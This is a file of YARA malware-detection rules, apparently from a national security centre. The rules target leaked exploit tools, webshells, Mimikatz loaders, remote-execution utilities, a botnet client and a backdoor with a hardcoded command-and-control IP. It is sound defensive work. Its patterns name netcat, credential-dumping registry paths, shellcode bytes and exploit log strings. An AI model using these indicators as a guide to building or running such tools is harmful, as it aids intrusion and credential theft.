      hash1 = "3d11fe89ffa14f267391bc539e6808d600e465955ddb854201a1f31a9ded4052"
   strings:
      $x1 = "[-] Error uploading shim to convert from LEAF shellcode to EDF handoff" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x2 = "[-] Error appending shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x3 = "[-] Error creating shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x4 = "[-] Error doing post processing" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x5 = "[-] Shellcode is too big" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $s6 = "[+] Connected to Browser named pipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s7 = "[+] Connecting to %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.50'*/
      $s8 = "[+] Exploit Payload Sent!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s9 = "[+] Bound to Dimsvc, sending exploit request to opnum 29" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s10 = "[-] Unable to connect to call into target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s11 = "[-] Error prepping plugin" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s12 = "[-] Post exploit callback timed out!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s13 = "[*] Calling into target!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s14 = "cnli-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "tibe-1.dll" fullword ascii /* score: '20.00'*/
      $s16 = "adfw-2.dll" fullword ascii /* score: '20.00'*/
      $s17 = "WonderlandPreloaderOption" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s18 = "xdvl-0.dll" fullword ascii /* score: '20.00'*/
      $s19 = "trch-0.dll" fullword ascii /* score: '20.00'*/
      $s20 = "adfw_setProcess" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 70KB and
        pe.imphash() == "dead1bc2d7e1f75d27360c46ea16ba28" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_Smbtouch_1_1_1 {
   meta:
      description = "Smbtouch-1.1.1.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
   strings:
      $x1 = "[+] Target is vulnerable to %d exploit%s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.00'*/
      $x2 = "[+] Target OS Version %d.%d build %d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x3 = "[+] Target OS Version %d.%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x4 = "[-] Target is not vulnerable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x5 = "[+] Target OS (Version numbers not specified)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x6 = "[+] Target is %s-bit" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x7 = "[-] Could not connect to share (0x%08X - %s)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x8 = "[!] Target is most likely 32-bit, but this value was not seen in testing!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s9 = "[!] Target could be either SP%d or SP%d," fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.50'*/
      $s10 = "[*] RedirectedTargetPort  %hu" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.42'*/
      $s11 = "Target OS version not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "[-] @%d: Error 0x%X - %s" fullword ascii /* score: '26.50'*/
      $s13 = "[*] Connecting to target..." fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.01'*/
      $s14 = "More neighbors needed for unauth or pipe/share required" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s15 = "Named pipe or share required for exploit" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s16 = "[-] Error with initial SMB connection, trying older method" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s17 = "Not a browser for unauth, pipe/share required" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s18 = "ErrorUnknownPrintProcessor" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s19 = "WsaErrorTooManyProcesses" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s20 = "NtErrorMoreProcessingRequired" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 400KB and
        pe.imphash() == "b9766464d73642777aca828daca14628" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_autotouch {
   meta:
      description = "autotouch.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "200ec4e8f16ed205cf94c02fcd73ee43ee511fa44ce34c458a1fca195c4bc737"
   strings:
      $x1 = "<t:config xmlns:t=\"urn:trch\" id=\"d685b3979e2b52bd60cb34c4c0f91b522fa28f54\" configversion=\"2.1.0.0\" name=\"Esteemaudittouch" ascii /* PEStudio Blacklist: strings */ /* score: '51.00'*/
      $x2 = "<?xml version='1.0' encoding='utf-8'?><config xmlns='urn:trch' name='Smbtouch' version='1.1.1' schemaversion='2.1.0' configversi" ascii /* PEStudio Blacklist: strings */ /* score: '51.00'*/
      $s3 = "O:\\Projects\\autotouch\\autosmbtouch\\obj\\Release\\autotouch.pdb" fullword ascii /* score: '26.00'*/
      $s4 = "GetProcess" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s5 = "autotouch.exe" fullword wide /* score: '22.00'*/
      $s6 = "<RunProcess>g__DoEvent0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s7 = "RunProcess" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s8 = "autosmbtouch.Properties.Resources.resources" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00'*/
      $s9 = "autosmbtouch.Properties.Resources" fullword wide /* PEStudio Blacklist: strings */ /* score: '15.00'*/
      $s10 = "OUTPUT.txt" fullword wide /* score: '14.00'*/
      $s11 = "IPS.txt" fullword wide /* score: '13.00'*/
      $s12 = "get_Esteemaudittouch_xml" fullword ascii /* score: '11.01'*/
      $s13 = "get_Smbtouch_xml" fullword ascii /* score: '10.01'*/
      $s14 = "autotouch" fullword ascii /* score: '8.00'*/
      $s15 = "15.0.0.0" fullword ascii /* score: '8.00'*/
      $s16 = "autosmbtouch.Properties" fullword ascii /* score: '8.00'*/
      $s17 = "autosmbtouch" fullword ascii /* score: '8.00'*/
      $s18 = "<config" fullword wide /* score: '6.00'*/
      $s19 = "Esteemaudittouch-2.1.0" fullword wide /* score: '5.00'*/
      $s20 = "Esteemaudittouch_xml" fullword wide /* score: '5.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}


rule NCSC_chro_guest {
   meta:
      description = "chro_guest.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "08a7fd5767e129ddea4c3c9a25a35613bf4ac09d67601a28713ee011e616bf7b"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "impacket.system_errors(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s5 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s7 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s9 = "opyi-windows-manifest-filename zzz_exploit.exe.manifest" fullword ascii /* score: '20.00'*/
      $s10 = "bCrypto.Hash._SHA256.pyd" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s12 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s14 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s15 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s16 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s17 = "bCrypto.Random.OSRNG.winrandom.pyd" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s18 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s19 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s20 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 16000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_CheckAccount_4_7 {
   meta:
      description = "CheckAccount 4.7.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "58c9e11a2cd18bc6762753b27225423257b0d8e84592a7fe8b1c9bdd97129546"
	  score = 70
   strings:
      $x1 = "MultiResponseServiceRequest.Execute" fullword wide /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x2 = "YTryGetPartnerAccess only supports {0} or a later version in Microsoft-hosted data center." fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x3 = "http://schemas.microsoft.com/Passport/SoapServices/SOAPFault" fullword wide /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x4 = "The UserId in the folder permission at index {0} is invalid. The StandardUser, PrimarySmtpAddress, or SID property must be set." fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x5 = "lThe UserId in the DelegateUser is invalid. The StandardUser, PrimarySmtpAddress or SID property must be set." fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x6 = "CheckAccount.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x7 = "ExchangeServiceBase.InternalProcessHttpErrorResponse" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s8 = "InternalProcessHttpErrorResponse does not handle 500 ISE errors, the caller is supposed to handle this." fullword wide /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s9 = "ComplexPropertyCollection.ItemChanged: the type of the complexProperty argument ({0}) is not supported." fullword wide /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s10 = "0The time zone transition target isn't supported." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s11 = "SCan't set both impersonated user and privileged user in the ExchangeService object." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "ErrorPublicFolderRequestProcessingFailed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s13 = "ServiceErrorHandling.ThrowOnError error handling is only valid for singleton request" fullword wide /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s14 = "http://schemas.microsoft.com/exchange/services/2006/messages" fullword wide /* score: '26.00'*/
      $s15 = "http://schemas.microsoft.com/exchange/services/2006/errors" fullword wide /* score: '26.00'*/
      $s16 = "http://schemas.microsoft.com/exchange/services/2006/types" fullword wide /* score: '26.00'*/
      $s17 = "`The item type returned by the service ({0}) isn't compatible with the requested item type ({1})." fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s18 = "UnsupportedTimeZonePeriodTransitionTarget" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s19 = "ErrorProxyRequestProcessingFailed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s20 = "}The IAsyncResult object was not returned from the corresponding asynchronous method of the original ExchangeService object.  " fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 1000KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule NCSC_Everything {
   meta:
      description = "Everything.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "a36fc0d9cb5b415fa8d6fe89434aca931bc4d0f9ac56ada7b7b9a9e601966860"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $s2 = "http://sf.symcb.com/sf.crl0a" fullword ascii /* score: '15.00'*/
      $s3 = "K0M0O0Q0S0U0W0" fullword ascii /* base64 encoded string '+C4;D4KE4[' */ /* score: '14.00'*/
      $s4 = ".tmp?Bookm" fullword ascii /* score: '14.00'*/
      $s5 = "543210" fullword ascii /* reversed goodware string '012345' */ /* score: '13.00'*/
      $s6 = "$t$$t9" fullword ascii /* reversed goodware string '9t$$t$' */ /* score: '13.00'*/
      $s7 = "mbridge" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s8 = "\"%s\" -cl4nt-" fullword ascii /* score: '11.00'*/
      $s9 = "Link TypeHost?File _" fullword ascii /* score: '10.00'*/
      $s10 = "\\2%hU%Sr" fullword ascii /* score: '9.00'*/
      $s11 = "zV:\\<Qt" fullword ascii /* score: '9.00'*/
      $s12 = "-- -!-\"-#" fullword ascii /* score: '8.00'*/
      $s13 = "%bDATA%\\U" fullword ascii /* score: '8.00'*/
      $s14 = "\\0^0`0b0e0g0i0p0q0s0t0v0w0y0z0|0" fullword ascii /* score: '8.00'*/
      $s15 = "sLogs\\" fullword ascii /* score: '8.00'*/
      $s16 = "B_WAIT" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
      $s17 = ":$xyM* j'" fullword ascii /* score: '8.00'*/
      $s18 = "+ DWH{" fullword ascii /* score: '7.00'*/
      $s19 = "+ 9va^D" fullword ascii /* score: '7.00'*/
      $s20 = "+ .A'2E" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 2000KB and
        pe.imphash() == "9c169dd9278ba909e8c071a1fb06b8f7" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_freeSSHd {
   meta:
      description = "freeSSHd.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "7135b6f6c58e6a3fa6e3fd25322e35a6904eac59c3e0a7e5e510ea12d23d37ca"
   strings:
      $s1 = "http://www.freesshd.com 0" fullword ascii /* score: '19.00'*/
      $s2 = "weonlydo.com1" fullword ascii /* score: '14.00'*/
      $s3 = "kreso@weonlydo.com0" fullword ascii /* score: '12.00'*/
      $s4 = "Inno Setup Setup Data (5.3.9)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00'*/
      $s5 = "freeSSHd SSH/Telnet Server Setup                            " fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s6 = "freeSSHd SSH/Telnet Server                                  " fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s7 = "#`fGET0Cy" fullword ascii /* score: '9.00'*/
      $s8 = "yNBn.jKU" fullword ascii /* score: '9.00'*/
      $s9 = "150202000521Z0#" fullword ascii /* PEStudio Blacklist: os */ /* score: '9.00'*/
      $s10 = "zTQcd}9* RUK" fullword ascii /* score: '8.00'*/
      $s11 = "vJP* " fullword ascii /* score: '7.42'*/
      $s12 = "D.PlU\"Hci" fullword ascii /* score: '7.00'*/
      $s13 = "5n- YTr" fullword ascii /* score: '7.00'*/
      $s14 = "f}- *K" fullword ascii /* score: '7.00'*/
      $s15 = "U\\ -om" fullword ascii /* score: '7.00'*/
      $s16 = ".cKh!H" fullword ascii /* score: '6.00'*/
      $s17 = "?l.WXy" fullword ascii /* score: '6.00'*/
      $s18 = "@c.aqr" fullword ascii /* score: '6.00'*/
      $s19 = "H\\.xNB<" fullword ascii /* score: '6.00'*/
      $s20 = "x@.nyj" fullword ascii /* score: '6.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 3000KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_Emeraldthread_3_0_0 {
   meta:
      description = "Emeraldthread-3.0.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "7fe425cd040608132d4f4ab2671e04b340a102a20c97ffdcf1b75be43a9369b5"
   strings:
      $x1 = "[+] Target is %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x2 = "[-] Exploit target failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x3 = "[*] Connecting to target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x4 = "[-] Payload comms failure" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $x5 = "[+] Connected to target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s6 = "[-] Payload initialization failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s7 = "[*] Configuring Payload" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s8 = "must be different than targetport" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s9 = "[*] Receiving Target Payload Callback" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s10 = "[+] Connection received on listening socket" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s11 = "[*] Calling in to listener on target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s12 = "[-] Failed to get %d byte authcode" fullword ascii /* score: '25.00'*/
      $s13 = "[*] Connecting to listener" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.01'*/
      $s14 = "[*] Exploiting target..." fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s15 = "[+] Listener address %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.50'*/
      $s16 = "[+] Connection accepted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s17 = "[-] InitializeExploitSocket() failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s18 = "[+] Listening on 0.0.0.0:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s19 = "[+] Setting password : (NULL)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s20 = "DropAndExecute" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 80KB and
        pe.imphash() == "a08bceeab75266182e75fb0d976dbccb" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}


rule NCSC_Anti_Webshell_{
   meta:
      description = "anti"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"

    strings:
    	$wf = "devilzShell" fullword ascii
    	
    	$s0 = "cmd" fullword ascii
    	$s1 = "netcat" fullword ascii
    	$s2 = "Execute" fullword ascii

    condition:
    	filesize < 100KB
    	and
    	$wf and (all of ($s*))
}



rule NCSC_proxy_Webshell_{
   meta:
      description = "anti"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"

    strings:
    	$wf = "<%@" fullword ascii
    	
    	$s0 = "GetHostByAddress" fullword ascii
    	$s1 = "proxy" fullword ascii
    	$s2 = "127.0.0.1" fullword ascii
		$s3 = "socks4aServer" fullword ascii
		$s4 = "port" fullword ascii
    condition:
    	filesize < 100KB
    	and
    	$wf and (all of ($s*))
}

rule S149_Rootkit
{
    meta:
        description = "S149 Backdoor. Drops a VirtualBox driver then expliot it"
        hash = ""
    condition:
        (uint16(0) == 0x5A4D) and
        pe.sections[1].name == ".ctext" and
	pe.number_of_resources >= 7
}

 
rule psexec_generic
{
    meta:
	author = "@patrickrolsen"
	reference = "Sysinternals PsExec Generic"
	filetype = "EXE"
	version = "0.2"
	date = "1/30/2014"
    strings:
	$s1 = "PsInfSvc"
	$s2 = "%s -install"
	$s3 = "%s -remove"
	$s4 = "psexec" nocase
    condition:
	uint16(0) == 0x5A4D and (all of ($s*))
}

rule S149_port_scanner
{
    meta:
      description = "S149 Port Scanner"
      hash = "3a97d9b6f17754dcd38ca7fc89caab04"
    strings:
      $s1 = "StringFileInfo" wide
      $s2 = "040904b0" wide
      $s3 = "Command line port scanner" wide
      $s4 = "Foundstone Inc." wide
      $s5 = "ScanLine" wide
      $s6 = "1, 0, 1, 0" wide
      $s7 = "InternalName" wide
      $s8 = "ScanLine" wide
      $s9 = "2002 Foundstone Inc." wide
    condition:
        uint16(0) == 0x5A4D and (all of ($s*))
}

rule S149_Remote_Execution_Tool1
{
    meta:
      description = "S149 IntelliAdmin Remote Execution Tool"
      hash = "46b4d31fcafaac43bc99c48140fa8afe"
    strings:
      $name = "IntelliAdmin Remote Execute"
      $help1 = "No username was provided"
      $help2 = "No password was provided"
      $help3 = "No filename was provided"
      $line =  "-h [host] -u [user] -p [pass] [options] [filename] [arguments]"
      $arg1 = "-h The remote host name or IP"
      $arg2 = "-u Username *"
      $arg3 = "-p Password *"
      $arg4 = "-e Don't load users environment variables"
      $arg5 = "-l Don't load users profile"
    condition:
        uint16(0) == 0x5A4D and 
        ( $name or 
           (all of ($help*) and 
            all of ($arg*) and 
            $line
           )
        )
}

rule S149_HackerTools_Scanner
{
    meta:
      description = "Hacker tools, Scanner"
      hash = "f01a9a2d1e31332ed36c1a4d2839f412"
    strings:
      $uri =  "www.unixwiz.net"
    condition:
        uint16(0) == 0x5A4D and $uri

}

rule S149_Trojan
{
   meta:
     description = "Files droppped by S149 trojan"
     hash = "f533c8e0584c81564964e7450ab965d1"
   strings:
     $file1 = "C:\\ProgramData\\msres.dmp"
     $file2 = "C:\\Users\\emp162\\AppData\\Local\\Temp\\vtmon.bin"
     $file3 = "C:\\ProgramData\\regce.dll"
    condition:
        uint16(0) == 0x5A4D and (all of ($file*))
}

rule S149_Remote_Execution_Tool2
{
   meta:
     description = "S149 Remote execution tool"
     hash = "08f73eeb100c61b80a967df2cc2a9c79"
   strings:
     $s1 = "%smstsc.exe" wide
     $s2 = "username:s:%s" wide
     $s3 = "domain:s:%s" wide
     $s4 = "password 51:b:" wide
     $s5 = "Rdp 0x%X, 0x%X" wide
    condition:
        uint16(0) == 0x5A4D and (all of ($s*))
}

rule S149_Raw_dd
{
  meta:
    description = "Rawwrite dd for windows"
    hash = "07b1675393a6c80078e29c9ea72de943"
  strings:
    $uri = "uranus.it.swin.edu.au"
    $name = "rawwrite dd for windows"
    condition:
        uint16(0) == 0x5A4D and $uri and $name
}

rule S149_WinPcap
{
  meta:
    description = "WinPcap"
    hash = "fbc146b03de722a0f8dfa7cefef94ab4"
  strings:
    $uri = "nsis.sf.net" 
    $name = "WinPcap" wide
  condition:
      uint16(0) == 0x5A4D and $uri and $name
}

rule S149_Email_Harvester
{
  meta:
    description = "mapid.tlb"
    hash = "mapid.tlb"
  strings:
    $s1 = "The Bat!"
    $s2 = "\\\\.\\pipe\\The Bat! %d CmdLine"
    $s3 = "`ec0fOutlook"
    $s4 = "FreeProws@4"
  condition:
      uint16(0) == 0x5A4D and ( all of ($s*) )
}
rule information_collector2
{
	meta:
	author = "NCSC"
	date = "2017-04-14"
	description = "This file collects information about users, network and security configurations of of the local host"
	hash = "e01544bdab952f8b1fb4549021ecd728"
	sample_filetype = "EXE"
	strings:
		$s0 = { 3d 3d 20 28 55 73 65 72 20 4e 61 6d 65 29 20 3d 3d }		
		$s1 = { 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 73 74 61 74 2e 64 61 74 }
		$s2 = { 74 61 73 6b 6b 69 6c 6c 20 2f 69 6d 20 77 69 6e 69 74 2e 65 78 65 20 2f 66 }
		$s3 = { 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 63 63 64 36 }
		$s4 = { 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 65 6d 70 5c 74 6d 70 38 38 37 33 }
	condition:
	uint16(0) == 0x5A4D and
	filesize > 910KB and
	filesize < 920KB and
	all of them	
}

rule information_collector
{
  meta:
    author = "NCSC"
    date = "2017-04-14"
    description = "This file collects information about users, network and security configurations of of the local host"
    hash = "7a107ec78c10f6f4ac9bc43761d6dd34"
    sample_filetype = "EXE"
  strings:
    $pdb_path = "C:\\Users\\me\\Desktop\\DB\\x64\\Release\\yum.pdb"
    $dump_file = { 6c 6f 63 61 6c 61 70 70 64 61 74 61 25 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 6a 54 6d 70 37 36 35 36 34 33 2e 74 78 74 } 
  condition:
    uint16(0) == 0x5A4D and
    filesize > 930KB and
    filesize < 940KB and
    1 of ($pdb_path,$dump_file)
}

rule remote_executor
{
  meta:
    author = "NCSC"
    date = "2017-04-14"
    description = "A powershell script to execute commands on a remote machine"
    hash = "820e504d649e72117e072a2ecf8831e2"
    sample_filetype = "PS1"
  strings:
    $cmdlet_name = "Invoke-WMIExec" 
    $stub_data = "0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53" 
    $example_hash = "F6F38B793DB6A94BA04A52F1D3EE92F0"
    $packet_query_var = "$packet_rem_query_interface = Get-PacketDCOMRemQueryInterface"
  condition:
    3 of them
}


rule password_dumpper1
{
  meta:
    author = "NCSC"
    date = "2017-04-14"
    description = "A Powershell to load a variant of MimiKatz and execute it on memory"
    hash = "0292bb84cd960c5888c9a85e2a38b804"
    sample_filetype = "PS1"
  strings:
    $procAddressC1 = "0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9" wide 
    $mimikatzDll = "TWltaWthdHpETEw"  wide
    $function_name = "function cccd" wide
  condition:
    $mimikatzDll and 1 of ($procAddressC1, $function_name)

}

rule password_dumpper2
{
  meta:
    author = "NCSC"
    date = "2017-04-14"
    description = "A Powershell to load a variant of MimiKatz and execute it on memory"
    hash = "2b218998ad3c8774c5b052126a7877f1"
    sample_filetype = "PS1"
  strings:
    $headrer = { 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 20 43 68 65 63 6b 20 4f 53 20 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 }
    $reg_path = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
    $tmp_file_name = "tmp741.tmp"
  condition:
    2 of them
}
rule neuron_botnet{
    meta:
        description = "YARA rules for detecting signature Neuron client."
        author = "NCSC"
    strings:
        $mz = { 4d 5a }
        $an0 = { 6e 65 75 72 6f 6e 2d 63 6c 69 65 6e 74 } //neuron-client
        $an1 = { 6E 65 75 72 6F 6E 5F 73 65 72 76 69 63 65 } //neuron_service
        $an2 = { 64 72 6F 70 70 65 72 2D 73 76 63 } //dropper-svc
        
        $adn = { 64 72 6F 70 70 65 72 } //dropper

        //neuron-service
        //dropper
        //dropper-svc
        
        $s0 = { 3c 3e 70 5f 5f 53 69 74 65 } // "<>p_Site"
        $s1 = { 43 6F 6D 6D 61 6E 64 53 63 72 69 70 74 }  //CommandScript
        $s2 = { 49 6E 73 74 72 75 63 74 69 6F 6E } //Instruction
        $s3 = { 4B 69 6C 6C 4F 6C 64 } //KillOld
        $s4 = { 45 6E 63 72 79 70 74 53 63 72 69 70 74 } //EncryptScript
        $s5 = { 53 6C 65 65 70 } //Sleep

    condition:
        $mz at 0 
        and
        (((1 of ($an*)) or ($s2 and $s1) or (3 of ($s*))) or ($adn and (1 of ($s*))))
        and
        filesize < 300KB
}

rule MTCAML_HTTPS_Backdoor 
{ meta: 
description = "HTTPS Backdoor" 
author = "NCSC" 
date = "2017-08-25" 
hash = "2e523daae73f8a20ab5939b81a5718905ee9550c" 
strings: 
$c2 = "144.76.109.28" 
condition: 
filesize < 10KB and 
( uint16(0) == 0x5a4d and $c2 ) 
}

rule MTCAML_MAL_1 
{ 
   meta: 
      description = "MAL1" 
      author = "NCSC" 
      date = "2017-08-25" 
      hash = "2e523daae73f8a20ab5939b81a5718905ee9550c" 
   strings: 
        $s1 = "opyi-windows-manifest-filename crackmapexec.exe.manifest" 
   condition: 
      filesize > 5MB and filesize < 7MB and 
         ( uint16(0) == 0x5a4d and $s1 ) 
} 

rule Invoke_mimi_base64 
{ 
	meta: 
	description = "Mimikatz in base64" 
	author = "NCSC" 
	date = "2017-08-26" 
	strings: 
